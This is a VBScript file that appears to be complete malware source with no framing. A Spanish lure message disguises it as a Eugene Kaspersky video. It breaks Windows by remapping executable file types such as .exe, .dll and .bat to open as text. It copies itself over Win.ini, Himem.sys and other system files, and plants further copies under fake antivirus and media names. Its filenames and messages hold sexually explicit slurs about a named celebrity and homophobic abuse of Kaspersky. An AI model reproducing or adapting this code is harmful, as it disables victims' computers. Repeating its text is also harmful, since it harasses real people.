MsgBox "Pajeate con el nuevo video de Eugene Kaspersky!!!, pru�balo por 30 d�as por 35 Euroz :)"

Set eugene = CreateObject ( "Wscript.Shell")
eugene.RegWrite "HKCR\.scr", "txtfile"
eugene.RegWrite "HKCR\.bat", "txtfile"
eugene.RegWrite "HKCR\.inf", "txtfile"
eugene.RegWrite "HKCR\.sys", "txtfile"
eugene.RegWrite "HKCR\.com", "txtfile"
eugene.RegWrite "HKCR\.dll", "txtfile"
eugene.RegWrite "HKCR\.pif", "txtfile"
eugene.RegWrite "HKCR\.ini", "txtfile"
eugene.RegWrite "HKCR\.exe", "txtfile"


Set FSO = Wscript.CreateObject("Scripting.FileSystemObject")
Set WindowsFolder = FSO.GetSpecialFolder(0)
Set SystemFolder = FSO.GetSpecialFolder(1)
Set TempFolder = FSO.GetSpecialFolder(2)
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\AVP3.0.exe", True
FSO.CopyFile Wscript.ScriptFullName, TempFolder & "\Eugene_Killer_Queen.AGM", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Himem.sys", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Emm386.exe", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Win.ini", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Rundll.exe", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Winhelp.exe", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Winhlp32.exe", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\AVP_ANTIVIRUS.JAJAJAJA", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\avpM.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\NOD32.jajajaja.EXE", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Loadqm.exe", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Cdplayer.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\avpcc.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\KasperStorm_Anti-Virus_Personal_PRO_4.0.Eugene_kaspersky.", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\NorzonAV2002.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\VShielld.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\EugeneKaspersky.ek", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\Christina_Aguilera_Sucking_my_dick_whit_SEMEN.MPEG", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\Trillian.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\Panda_Gay_AntiVirus.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\CristinaAguilera_fucked_by_Eugene.BMP", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Cristina_IFUCKYOU!!!.vbs", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Asd.exe", True
Set TextFile1 = FSO.CreateTextFile(WindowsFolder & "\Christina_ILOVEYOU.txt", True)

TextFile1.WriteLine "Eugene, que nombre m�s maricon para aquel rostro tuyo tan cicatrizado como el basurero, con solo mirarte vomito, te tengo en mi culo, espero que tu tambi�n me tengas en tu mente, ."
TextFile1.Close
MsgBox "El video de Eugene Kaspersky ya est� instalado en tu computadora"
MsgBox "Antes de verlo, s�lo debes reiniciar tu computadora, luego de eso... Disfrutalo.."
MsgBox "Kaspersky AntiVirus is very poor, plese use F-Secure, More Known as F-PROT"
